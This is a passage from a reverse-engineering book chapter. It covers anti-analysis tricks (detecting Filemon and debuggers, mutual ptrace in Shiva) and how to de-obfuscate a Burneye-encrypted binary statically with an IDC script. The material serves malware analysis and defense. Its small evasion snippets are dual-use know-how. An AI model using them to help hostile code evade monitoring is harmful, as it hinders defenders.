class="titlepage"><div><div><h2 class="title"><a id="detecting_instrumentation"/>Detecting Instrumentation</h2></div></div></div><p>Following creation of your sandbox environment and prior to executing any program you want to observe, you need to ensure that instrumentation is in place to properly collect and record information about the behavior of the program you are analyzing. A wide variety of tools exists for performing such monitoring tasks. Two widely used examples include Process Monitor,<sup>[<a class="footnote" href="#ftn.CHP-21-FN-26" id="CHP-21-FN-26">174</a>]</sup> from the Sysinternals group<sup>[<a class="footnote" href="#ftn.CHP-21-FN-27" id="CHP-21-FN-27">175</a>]</sup> at Microsoft, and Wireshark.<sup>[<a class="footnote" href="#ftn.CHP-21-FN-28" id="CHP-21-FN-28">176</a>]</sup> Process Monitor is a utility capable of monitoring certain activities associated with any running Windows process, including accesses to the Windows registry and file system activity. Wireshark is a network packet capture and analysis tool often used to analyze the network traffic generated by malicious software.<a class="indexterm" id="IDX-CHP-21-0106"/><a class="indexterm" id="IDX-CHP-21-0107"/></p><p>Malware authors with a sufficient level of paranoia may program their software to search for running instances of such monitoring programs. Techniques range from scanning the active process list for process names known to be associated with such monitoring software to scanning the title bar text for all active Windows applications to search for known strings. Deeper searches can be performed, with some software going so far as to search for specific characteristics associated with Windows GUI components used within certain instrumentation software. For example, the WinLicense obfuscation/protection program uses the following function call to attempt to determine whether the Filemon (a predecessor of Process Monitor) utility is currently executing:<a class="indexterm" id="IDX-CHP-21-0108"/><a class="indexterm" id="IDX-CHP-21-0109"/><a class="indexterm" id="IDX-CHP-21-0110"/><a class="indexterm" id="IDX-CHP-21-0111"/><a class="indexterm" id="IDX-CHP-21-0112"/><a class="indexterm" id="IDX-CHP-21-0113"/><a class="indexterm" id="IDX-CHP-21-0114"/><a class="indexterm" id="IDX-CHP-21-0115"/></p><a id="I_programlisting2_d1e36522"/><pre class="programlisting">if (FindWindow("FilemonClass", NULL)) {
   //exit because Filemon is running
}</pre><p>In this case, the <code class="literal">FindWindow</code> function is being used to search for a top-level application window based on the registered class name (<code class="literal">"FilemonClass"</code>) of the window rather than the window’s title. If a window of the requested class is located, then Filemon is assumed to be executing, and the program terminates.</p></div><div class="sect2" title="Detecting Debuggers"><div class="titlepage"><div><div><h2 class="title"><a id="detecting_debuggers"/>Detecting Debuggers</h2></div></div></div><p>Moving beyond simple observation of a program, the use of a debugger allows an analyst to take complete control of the execution of program that requires analyzing. A common use of a debugger with obfuscated programs is to run the obfuscated program just long enough to complete any decompression or decryption tasks and then utilize the debugger’s memory-access features to extract the de-obfuscated process image from memory. In most cases, standard static analysis tools and techniques can be used to complete the analysis of the extracted process image.<a class="indexterm" id="IDX-CHP-21-0116"/></p><p>The authors of obfuscation utilities are well aware of such debugger-assisted de-obfuscation techniques, so they have developed measures to attempt to defeat the use of debuggers for execution of their obfuscated programs. Programs that detect the presence of a debugger often choose to terminate rather than proceed with any operations that might allow an analyst to more easily determine the behavior of the program.</p><p>Techniques for detecting the presence of debuggers range from simple queries to the operating system via well-known API functions, such as the Windows <code class="literal">IsDebuggerPresent</code> function, to lower-level checks for memory or processor artifacts resulting from the use of a debugger. An example of the latter includes detecting that a processor’s trace (single-step) flag is set. Detection of specific debuggers is also possible in some cases. For example, SoftIce, a Windows kernel debugger, can be detected through the presence of the <code class="literal">"\\.\NTICE"</code> device, which is used to communicate with the debugger.<a class="indexterm" id="IDX-CHP-21-0117"/></p><p>As long as you know what to look for, there is nothing terribly tricky about trying to detect a debugger, and attempts to do so are easily observed during static analysis (unless anti–static analysis techniques are employed simultaneously). For more information on debugger detection, consult Nicolas Falliere’s article “Windows Anti-Debug Reference,”<sup>[<a class="footnote" href="#ftn.CHP-21-FN-29" id="CHP-21-FN-29">177</a>]</sup> which provides a comprehensive overview of Windows anti-debugging techniques.<sup>[<a class="footnote" href="#ftn.CHP-21-FN-30" id="CHP-21-FN-30">178</a>]</sup> In addition, OpenRCE maintains an Anti Reverse Engineering Techniques Database,<sup>[<a class="footnote" href="#ftn.CHP-21-FN-31" id="CHP-21-FN-31">179</a>]</sup> which contains a number of debugger-specific techniques.<a class="indexterm" id="IDX-CHP-21-0118"/><a class="indexterm" id="IDX-CHP-21-0119"/><a class="indexterm" id="IDX-CHP-21-0120"/><a class="indexterm" id="IDX-CHP-21-0121"/><a class="indexterm" id="IDX-CHP-21-0122"/><a class="indexterm" id="IDX-CHP-21-0123"/></p></div><div class="sect2" title="Preventing Debugging"><div class="titlepage"><div><div><h2 class="title"><a id="preventing_debugging"/>Preventing Debugging</h2></div></div></div><p>If a debugger manages to remain undetectable, there are still a number of techniques available to thwart its use. These additional techniques attempt to confound the debugger by introducing spurious breakpoints, clearing hardware breakpoints, hindering disassembly to make selection of appropriate breakpoint addresses difficult, or preventing the debugger from attaching to a process in the first place. Many of the techniques discussed in Nicolas Falliere’s article are geared toward preventing debuggers from operating correctly.<a class="indexterm" id="IDX-CHP-21-0124"/></p><p>Intentionally generating exceptions is one means by which a program may attempt to hinder debugging. In most cases, an attached debugger will catch the exception, and the user of the debugger is faced with the task of analyzing why the exception occurred and whether to pass the exception along to the program being debugged. In the case of a software breakpoint such as the x86 <code class="literal">int 3</code>, it may be difficult to distinguish a software interrupt generated by the underlying program from one that results from an actual debugger breakpoint. This confusion is exactly the effect that is desired by the creator of the obfuscated program. In such cases, careful analysis of the disassembly listing to understand the true program flow is usually possible, though the level of effort for static analysis is raised somewhat.</p><p>Encoding portions of a program in some manner has the dual effect of hindering static analysis because disassembly is not possible and of hindering debugging because placing breakpoints is difficult. Even if the start of each instruction is known, software breakpoints cannot be placed until the instructions have actually been decoded, as altering the instructions by inserting a software breakpoint is likely to result in a failed decryption of the obfuscated code and a resulting crash of the program when execution reaches the intended breakpoint.<a class="indexterm" id="IDX-CHP-21-0125"/></p><p>Alternatively, some de-obfuscation routines compute checksum values over ranges of bytes within the process. If one or more software breakpoints have been set within the range over which a checksum is being computed, the resulting checksum will be incorrect, and the program is likely to abort.</p><p>The Shiva ELF obfuscation tool for Linux makes use of a technique called <span class="emphasis"><em>mutual ptrace</em></span> to prevent the use of a debugger in analyzing Shiva’s behavior.<a class="indexterm" id="IDX-CHP-21-0126"/></p><div class="sidebar"><a id="process_tracing"/><p class="title">PROCESS TRACING</p><p>The <span class="emphasis"><em>ptrace</em></span>, or process tracing, API is available on many Unix systems and provides a mechanism for one process to monitor and control the execution of another process. The GNU debugger (gdb) is one of the more well-known applications that makes use of the ptrace API. Using the ptrace API, a ptrace parent process may attach to and control the execution of a ptrace child process. In order to begin controlling a process, a parent process must first <span class="emphasis"><em>attach</em></span> to the child process that it seeks to control. Once attached, the child process is stopped anytime it receives a signal, and the parent is notified of this fact via the POSIX <code class="literal">wait</code> function, at which point the parent may choose to alter or inspect the state of the child process before instructing the child process to continue execution. Once a parent process has attached to a child process, no other process may attach to the same child process until the tracing parent chooses to detach from the child process.<a class="indexterm" id="IDX-CHP-21-0127"/><a class="indexterm" id="IDX-CHP-21-0128"/><a class="indexterm" id="IDX-CHP-21-0129"/><a class="indexterm" id="IDX-CHP-21-0130"/><a class="indexterm" id="IDX-CHP-21-0131"/><a class="indexterm" id="IDX-CHP-21-0132"/><a class="indexterm" id="IDX-CHP-21-0133"/><a class="indexterm" id="IDX-CHP-21-0134"/><a class="indexterm" id="IDX-CHP-21-0135"/></p></div><p>Shiva takes advantage of the fact that a process may be ptraced by only one other process at any given time. Early in its execution, the Shiva process forks to create a copy of itself. The original Shiva process immediately performs a ptrace attach operation on the newly forked child. The newly forked child process, in turn, immediately attaches to its parent process. If either attach operation fails, Shiva terminates under the assumption that another debugger is being used to monitor the Shiva process. If both operations succeed, then no other debugger can be used to attach to the running Shiva pair, and Shiva can continue to run without fear of being observed. While operating in this manner, either Shiva process may alter the state of the other, making it difficult to determine, using static analysis techniques, what the exact control flow path is through the Shiva binary.<a class="indexterm" id="IDX-CHP-21-0136"/></p></div><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-22" id="ftn.CHP-21-FN-22">170</a>] </sup>An <span class="emphasis"><em>OUI</em></span> makes up the first three bytes of a network adapter’s factory-assigned MAC address.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-23" id="ftn.CHP-21-FN-23">171</a>] </sup>See <a class="ulink" href="http://www.codeproject.com/KB/system/VmDetect.aspx">http://www.codeproject.com/KB/system/VmDetect.aspx</a> by Elias Bachaalany.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-24" id="ftn.CHP-21-FN-24">172</a>] </sup>See <a class="ulink" href="http://www.invisiblethings.org/papers/redpill.html">http://www.invisiblethings.org/papers/redpill.html</a></p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-25" id="ftn.CHP-21-FN-25">173</a>] </sup>See <a class="ulink" href="http://handlers.sans.org/tliston/ThwartingVMDetection_Liston_Skoudis.pdf">http://handlers.sans.org/tliston/ThwartingVMDetection_Liston_Skoudis.pdf</a></p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-26" id="ftn.CHP-21-FN-26">174</a>] </sup>See <a class="ulink" href="http://technet.microsoft.com/en-us/sysinternals/bb896645.aspx">http://technet.microsoft.com/en-us/sysinternals/bb896645.aspx</a></p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-27" id="ftn.CHP-21-FN-27">175</a>] </sup>See <a class="ulink" href="http://technet.microsoft.com/en-us/sysinternals/default.aspx">http://technet.microsoft.com/en-us/sysinternals/default.aspx</a></p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-28" id="ftn.CHP-21-FN-28">176</a>] </sup>See <a class="ulink" href="http://www.wireshark.org/">http://www.wireshark.org/</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-29" id="ftn.CHP-21-FN-29">177</a>] </sup>See <a class="ulink" href="http://www.symantec.com/connect/articles/windows-anti-debug-reference/">http://www.symantec.com/connect/articles/windows-anti-debug-reference/</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-30" id="ftn.CHP-21-FN-30">178</a>] </sup>See <a class="ulink" href="http://pferrie.tripod.com/papers/unpackers.pdf/">http://pferrie.tripod.com/papers/unpackers.pdf/</a> by Peter Ferrie.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-31" id="ftn.CHP-21-FN-31">179</a>] </sup>See <a class="ulink" href="http://www.openrce.org/reference_library/anti_reversing/">http://www.openrce.org/reference_library/anti_reversing/</a></p></div></div></div>
<div class="sect1" title="Static De-obfuscation of Binaries Using IDA"><div class="titlepage"><div><div><h1 class="title"><a id="static_de-obfuscation_of_binaries_using"/>Static De-obfuscation of Binaries Using IDA</h1></div></div></div><p>At this point you may be wondering how, given all of the anti–reverse engineering techniques available, it is possible to analyze software that a programmer is intent on keeping secret. Given that these techniques target both static analysis tools and dynamic analysis tools, what is the best approach to take in revealing a program’s hidden behavior? Unfortunately, there is no single solution that fits all cases equally well. In most cases, the solution depends on your skill set and the tools available to you. If your analysis tool of choice is a debugger, then you will need to develop strategies for circumventing debugger detection and prevention protections. If your preferred analysis tool is a disassembler, you will need to develop strategies for obtaining an accurate disassembly and, in cases in which self-modifying code is encountered, for mimicking the behavior of that code in order to properly update your disassembly listings.</p><p>In this section we will discuss two techniques for dealing with self-modifying code in a static analysis environment (that is, without executing the code). Static analysis may be your only option for cases in which you are unwilling (because of hostile code) or unable (because of a lack of hardware or appropriate sandbox environment) to analyze a program while controlling it with a debugger.<a class="indexterm" id="IDX-CHP-21-0137"/><a class="indexterm" id="IDX-CHP-21-0138"/><a class="indexterm" id="IDX-CHP-21-0139"/><a class="indexterm" id="IDX-CHP-21-0140"/><a class="indexterm" id="IDX-CHP-21-0141"/><a class="indexterm" id="IDX-CHP-21-0142"/></p><div class="sect2" title="Script-Oriented De-obfuscation"><div class="titlepage"><div><div><h2 class="title"><a id="script-oriented_de-obfuscation"/>Script-Oriented De-obfuscation</h2></div></div></div><p>Because IDA may be used to disassemble binaries developed for a number of different CPU types, it is not uncommon to analyze a binary developed for an entirely different platform than the one on which you are running IDA. For example, you may be asked to analyze a Linux x86 binary even though you happen to run the Windows version of IDA, or you may be asked to analyze a MIPS or ARM binary even though IDA runs only on x86 platforms. In such cases you may not have access to dynamic analysis tools, such as debuggers, suitable for use in performing dynamic analysis on the binary you have been given. When such a binary has been obfuscated by encoding portions of the program, you may have no other option than to create an IDA script that will mimic the de-obfuscating stage of the program in order to properly decode the program and disassemble the decoded instructions and data.</p><p>This may seem like a daunting task. However, in many cases the decoding stages of an obfuscated program make use of only a small subset of a processor’s instruction set, so familiarizing yourself with the necessary operations may not require an understanding of the entire instruction set for the target CPU.</p><p><a class="xref" href="ch15.html" title="Chapter 15. IDA Scripting">Chapter 15</a> presented an algorithm for developing scripts that emulate the behavior of portions of a program. In the following example, we will utilize those steps to develop a simple IDC script to decode a program that has been encrypted with the Burneye ELF encryption tool. In our example program, execution begins with the instructions in <a class="xref" href="ch21s03.html#burneye_startup_sequence_and_obfuscated" title="Example 21-2. Burneye startup sequence and obfuscated code">Example 21-2</a>.<a class="indexterm" id="IDX-CHP-21-0143"/><a class="indexterm" id="IDX-CHP-21-0144"/><a class="indexterm" id="IDX-CHP-21-0145"/></p><div class="example"><a id="burneye_startup_sequence_and_obfuscated"/><p class="title">Example 21-2. Burneye startup sequence and obfuscated code</p><div class="example-contents"><pre class="programlisting">LOAD:05371035 start           proc near
  LOAD:05371035
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/> LOAD:05371035                 push    off_5371008
<img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/> LOAD:0537103B                 pushf
<img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/> LOAD:0537103C                 pusha
<img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/> LOAD:0537103D                 mov     ecx, dword_5371000
  LOAD:05371043                 jmp     loc_5371082
  ...
  LOAD:05371082 loc_5371082:                       ; CODE XREF: start+E↑j
<img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/> LOAD:05371082                 call    sub_5371048
  LOAD:05371087                 sal     byte ptr [ebx-2Bh], 1
  LOAD:0537108A                 pushf
  LOAD:0537108B                 xchg    al, [edx-11h]
  LOAD:0537108E                 pop     ss
  LOAD:0537108F                 xchg    eax, esp
  LOAD:05371090                 cwde
  LOAD:05371091                 aad     8Eh
  LOAD:05371093                 push    ecx
<img alt="" src="httpatomoreillycomsourcenostarchimages854101.png"/> LOAD:05371094                 out     dx, eax
  LOAD:05371095                 add     [edx-57E411A0h], bh
  LOAD:0537109B                 push    ss
  LOAD:0537109C                 rcr     dword ptr [esi+0Ch], cl
    LOAD:0537109F                 push    cs
  LOAD:053710A0                 sub     al, 70h
  LOAD:053710A2                 cmp     ch, [eax+6Eh]
  LOAD:053710A5                 cmp     dword ptr ds:0CBD35372h, 9C38A8BCh
  LOAD:053710AF                 and     al, 0F4h
<img alt="" src="httpatomoreillycomsourcenostarchimages854103.png"/> LOAD:053710B1                 db      67h</pre></div></div><p>The program begins by pushing the contents of memory location <code class="literal">05371008h</code> onto the stack <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e36789"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> before pushing the CPU flags <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e36795"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span> and then pushing all CPU registers <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e36801"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span>. The purpose of these instructions is not immediately clear, so we simply file this information away for later. Next, the ECX register is loaded with the contents of memory location <code class="literal">5371000h</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e36811"/><img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/></span>. According to the algorithm presented in <a class="xref" href="ch15.html" title="Chapter 15. IDA Scripting">Chapter 15</a>, we need to declare a variable named <code class="literal">ecx</code> at this point and initialize it from memory using IDC’s <code class="literal">Dword</code> function, as shown here:<a class="indexterm" id="IDX-CHP-21-0146"/><a class="indexterm" id="IDX-CHP-21-0147"/><a class="indexterm" id="IDX-CHP-21-0148"/><a class="indexterm" id="IDX-CHP-21-0149"/></p><a id="I_programlisting2_d1e36838"/><pre class="programlisting">auto ecx;
ecx = Dword(0x5371000);    //from instruction 0537103D</pre><p>Following an absolute jump, the program calls function <code class="literal">sub_5371048</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e36845"/><img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/></span>, which has the side effect of pushing address <code class="literal">05371087h</code> (the return address) onto the stack. Note that the disassembled instructions that follow the <code class="literal">call</code> instruction begin to make less and less sense. The <code class="literal">out</code> instruction <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e36861"/><img alt="" src="httpatomoreillycomsourcenostarchimages854101.png"/></span> is not generally encountered in user-space code, while IDA is unable to disassemble an instruction at address <code class="literal">053710B1h</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e36870"/><img alt="" src="httpatomoreillycomsourcenostarchimages854103.png"/></span>. These are both indications that something is not quite right with this binary (that and the fact that the Functions window lists only two functions).</p><p>At this point, analysis needs to continue with function <code class="literal">sub_5371048</code>, which is shown in <a class="xref" href="ch21s03.html#main_burneye_decoding_function" title="Example 21-3. Main Burneye decoding function">Example 21-3</a>.</p><div class="example"><a id="main_burneye_decoding_function"/><p class="title">Example 21-3. Main Burneye decoding function</p><div class="example-contents"><pre class="programlisting">LOAD:05371048 sub_5371048     proc near   ; CODE XREF: start:loc_5371082↓p
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/> LOAD:05371048                 pop     esi
<img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/> LOAD:05371049                 mov     edi, esi
<img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/> LOAD:0537104B                 mov     ebx, dword_5371004
  LOAD:05371051                 or      ebx, ebx
<img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/> LOAD:05371053                 jz      loc_537107F
<img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/> LOAD:05371059                 xor     edx, edx
<img alt="" src="httpatomoreillycomsourcenostarchimages854101.png"/> LOAD:0537105B loc_537105B:                ; CODE XREF: sub_5371048+35↓j
  LOAD:0537105B                 mov     eax, 8
<img alt="" src="httpatomoreillycomsourcenostarchimages854103.png"/> LOAD:05371060 loc_5371060:                ; CODE XREF: sub_5371048+2B↓j
  LOAD:05371060                 shrd    edx, ebx, 1
  LOAD:05371064                 shr     ebx, 1
  LOAD:05371066                 jnb     loc_5371072
  LOAD:0537106C                 xor     ebx, 0C0000057h
  LOAD:05371072 loc_5371072:                ; CODE XREF: sub_5371048+1E↑j
  LOAD:05371072                 dec     eax
  LOAD:05371073                 jnz     short loc_5371060
  LOAD:05371075                 shr     edx, 18h
  LOAD:05371078                 lodsb
    LOAD:05371079                 xor     al, dl
  LOAD:0537107B                 stosb
  LOAD:0537107C                 dec     ecx
  LOAD:0537107D                 jnz     short loc_537105B
  LOAD:0537107F loc_537107F:                ; CODE XREF: sub_5371048+B↑j
  LOAD:0537107F                 popa
  LOAD:05371080                 popf
  LOAD:05371081                 retn</pre></div></div><p>Closer inspection reveals that this is not a typical function in that it begins by immediately popping the return address off the stack into the ESI register <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e36933"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span>. Recalling that the saved return address was <code class="literal">05371087h</code>, and taking into account the initialization of EDI <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e36942"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span>, EBX <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e36948"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span>, and EDX <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e36954"/><img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/></span>, our script grows to the following:<a class="indexterm" id="IDX-CHP-21-0150"/></p><a id="I_programlisting2_d1e36965"/><pre class="programlisting">auto ecx, esi, edi, ebx, edx;
ecx = Dword(0x5371000);   //from instruction 0537103D
esi = 0x05371087;         //from instruction 05371048
edi = esi;                //from instruction 05371049
ebx = Dword(0x5371004);   //from instruction 0537104B
edx = 0;                  //from instruction 05371059</pre><p>Following these initializations, the function performs a test on the value contained in the EBX register <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e36969"/><img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/></span> before entering an outer loop <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e36975"/><img alt="" src="httpatomoreillycomsourcenostarchimages854101.png"/></span> and an inner loop <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e36981"/><img alt="" src="httpatomoreillycomsourcenostarchimages854103.png"/></span>. The remaining logic of the function is captured in the following completed script. Within the script, comments are used to relate script actions to the corresponding actions in the preceding disassembly listing.</p><a id="I_programlisting2_d1e36987"/><pre class="programlisting">auto ecx, esi, edi, ebx, edx, eax, cf;
  ecx = Dword(0x5371000);   //from instruction 0537103D
  esi = 0x05371087;         //from instruction 05371048
  edi = esi;                //from instruction 05371049
  ebx = Dword(0x5371004);   //from instruction 0537104B
  if (ebx != 0) {           //from instructions 05371051 and 05371053
     edx = 0;               //from instruction 05371059
     do {
        eax = 8;            //from instruction 0537105B
        do {
           //IDC does not offer an equivalent of the x86 shrd instruction so we
           //need to derive the behavior using several operations
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>           edx = (edx
 &gt;&gt; 1) &amp; 0x7FFFFFFF;   //perform unsigned shift right one bit
           cf = ebx &amp; 1;                    //remember the low bit of ebx
           if (cf == 1) {                   //cf represents the x86 carry flag
              edx = edx | 0x80000000;       //shift in the low bit of ebx if it is 1
           }
           ebx = (ebx &gt;&gt; 1) &amp; 0x7FFFFFFF;   //perform unsigned shift right one bit
           if (cf == 1) {                   //from instruction 05371066
              ebx = ebx ^ 0xC0000057;       //from instruction 0537106C
           }
           eax--;                  //from instruction 05371072
        } while (eax != 0);        //from instruction 05371073
<img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>       edx = (edx &gt;&gt; 24) &amp; 0xFF;  //perform unsigned shift right 24 bits
<img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/>       eax = Byte(esi++);         //from instruction 05371078
        eax = eax ^ edx;           //from instruction 05371079
<img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/>       PatchByte(edi++, eax);     //from instruction 0537107B
        ecx--;                     //from instruction 0537107C
     } while (ecx != 0);           //from instruction 0537107D
  }</pre><p>There are two minor points to raise with this example. First, the right shift operator (<code class="literal">&gt;&gt;</code>) in IDC performs signed shifts (meaning that the sign bit is replicated into the most significant bit), while the x86 <code class="literal">shr</code> and <code class="literal">shrd</code> instructions perform unsigned shifts. In order to emulate an unsigned right shift in IDC, we must clear all bits that have been shifted in from the left, as is done at <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e37024"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> and <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e37030"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span>. The second point involves the choice of an appropriate data size and variable to properly implement the x86 <code class="literal">lodsb</code> (load string byte) and <code class="literal">stosb</code> (store string byte) instructions. These instructions write to (<code class="literal">lodsb</code>) and read from (<code class="literal">stosb</code>) the low-order 8 bits of the EAX register,<sup>[<a class="footnote" href="#ftn.CHP-21-FN-32" id="CHP-21-FN-32">180</a>]</sup> leaving the upper 24 bits unchanged. In IDC, there is no way to partition a variable into bit-sized portions other than using various bitwise operations to mask off and recombine portions of the variable. Specifically, in the case of the <code class="literal">lodsb</code> instruction, a more faithful emulation would read as follows:<a class="indexterm" id="IDX-CHP-21-0151"/><a class="indexterm" id="IDX-CHP-21-0152"/><a class="indexterm" id="IDX-CHP-21-0153"/><a class="indexterm" id="IDX-CHP-21-0154"/><a class="indexterm" id="IDX-CHP-21-0155"/><a class="indexterm" id="IDX-CHP-21-0156"/><a class="indexterm" id="IDX-CHP-21-0157"/><a class="indexterm" id="IDX-CHP-21-0158"/><a class="indexterm" id="IDX-CHP-21-0159"/><a class="indexterm" id="IDX-CHP-21-0160"/><a class="indexterm" id="IDX-CHP-21-0161"/><a class="indexterm" id="IDX-CHP-21-0162"/></p><a id="I_programlisting2_d1e37094"/><pre class="programlisting">eax = (eax &amp; 0xFFFFFF00) | (Byte(esi++) &amp; 0xFF);</pre><p>This example first clears the low 8 bits of the EAX variable and then merges in the new value for the low 8 bits using an <code class="literal">OR</code> operation. In the Burn-eye decoding example, we make note of the fact that the entire EAX register is set to 8 at the beginning of each outer loop, which has the effect of zeroing the upper 24 bits of EAX. As a result, we have elected to simplify our implementation of <code class="literal">lodsb</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e37104"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span> by ignoring the effect of the assignment on the upper 24 bits of EAX. No thought need be given to our implementation of <code class="literal">stosb</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e37113"/><img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/></span>, as the <code class="literal">PatchByte</code> function reads only from the low-order 8 bits of its input value (EAX in this case).</p><p>Following execution of the Burneye decoding IDC script, our database would reflect all of the changes that would normally not be observable until the obfuscated program was executed on a Linux system. If the de-obfuscation process was carried out properly, we are very likely to see many more legible strings within IDA’s Strings window. In order to observe this fact, you may need to refresh the Strings window content by closing and reopening the window or by right-clicking within the window, selecting Setup, and then clicking OK. Either action causes IDA to rescan the database for string content.</p><p>Remaining tasks include determining where the decoding function will return, given that it popped its return address in the very first instruction of the function, along with coaxing IDA to properly display the decoded byte values as instructions or data as appropriate. The Burneye decoding function ends with the following three instructions:<a class="indexterm" id="IDX-CHP-21-0163"/><a class="indexterm" id="IDX-CHP-21-0164"/><a class="indexterm" id="IDX-CHP-21-0165"/><a class="indexterm" id="IDX-CHP-21-0166"/></p><a id="I_programlisting2_d1e37139"/><pre class="programlisting">LOAD:0537107F                 popa
LOAD:05371080                 popf
LOAD:05371081                 retn</pre><p>Recall that the function began by popping its own return address, which means that the remaining stack values were set up by the caller. The <code class="literal">popa</code> and <code class="literal">popf</code> instructions used here are the counterparts to the <code class="literal">pusha</code> and <code class="literal">pushf</code> instructions used at the beginning of Burneye’s start routine, as shown here:</p><a id="I_programlisting2_d1e37155"/><pre class="programlisting">LOAD:05371035 start           proc near
  LOAD:05371035
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/> LOAD:05371035                 push    off_5371008
  LOAD:0537103B                 pushf
  LOAD:0537103C                 pusha</pre><p>The net result is that the only value that remains on the stack is the one that was pushed at the first line of <code class="literal">start</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e37169"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span>. It is to this location that the Burneye decoding routine returns, and it is at this location that further analysis of the Burneye protected binary would need to continue.</p><p>The preceding example may make it seem like writing a script to decode or unpack an obfuscated binary is a relatively easy thing to do. This is true in the case of Burneye, which does not use a terribly sophisticated initial obfuscation algorithm. The de-obfuscation stub of more sophisticated utilities such as ASPack and tElock would require somewhat more effort to implement using IDC.</p><p>Advantages to script-based de-obfuscation include the fact that the binary being analyzed need never be executed and that it is possible to create a functional script without ever developing a complete understanding of the exact algorithm used to de-obfuscate the binary. This latter statement may seem counterintuitive, as it would seem that you would need to have a complete understanding of the de-obfuscation before you could emulate the algorithm using a script. Using the development process described here and in <a class="xref" href="ch15.html" title="Chapter 15. IDA Scripting">Chapter 15</a>, however, all you really need is a complete understanding of each CPU instruction involved in the de-obfuscation process. By faithfully implementing each CPU action using IDC and properly sequencing each action according to the disassembly listing, you will have a script that mimics the program’s actions even if you do not fully comprehend the higher-level algorithm that those actions, as a whole, implement.</p><p>Disadvantages of using a script-based approach include the fact that the scripts are rather fragile. If a de-obfuscation algorithm changes as a result of an upgrade to a de-obfuscation tool or through the use of alternate command-line settings supplied to the obfuscation tool, it is quite likely that a script that had been effective against that tool will need to be modified accordingly. For example, it is possible to develop a generic unpacking script for use with binaries packed using UPX,<sup>[<a class="footnote" href="#ftn.CHP-21-FN-33" id="CHP-21-FN-33">181</a>]</sup> but such a script requires constant tuning as UPX evolves.</p><p>Finally, scripted de-obfuscation suffers from the lack of a one-size-fits-all solution to de-obfuscation. There is no megascript capable of de-obfuscating all binaries. In a sense, scripted de-obfuscation suffers from many of the same shortcomings as signature-based intrusion-detection and antivirus systems. A new script must be developed for each new type of packer, and subtle changes in existing packers are likely to break existing scripts.<a class="indexterm" id="IDX-CHP-21-0167"/><a class="indexterm" id="IDX-CHP-21-0168"/><a class="indexterm" id="IDX-CHP-21-0169"/><a class="indexterm" id="IDX-CHP-21-0170"/><a class="indexterm" id="IDX-CHP-21-0171"/></p></div><div class="sect2" title="Emulation-Oriented De-obfuscation"><div class="titlepage"><div><div><h2 class="title"><a id="emulation-oriented_de-obfuscation"/>Emulation-Oriented De-obfuscation</h2></div></div></div><p>A recurring theme encountered when creating scripts to perform de-obfuscation tasks is the need to emulate a CPU’s instruction set so the script behaves identically to the program being de-obfuscated. If we had an actual instruction emulator at our disposal, it might be possible to shift some or all of the work performed by these scripts over to the emulator and drastically reduce the amount of time required to de-obfuscate an IDA database. Emulators can fill the void between scripts and debuggers and have the advantage of being both more efficient than scripts and more flexible than debuggers. Using emulators, for example, it is possible to emulate a MIPS binary on an x86 platform or to emulate instructions from a Linux ELF binary on a Windows platform.<a class="indexterm" id="IDX-CHP-21-0172"/></p><p>Emulators vary in sophistication. At 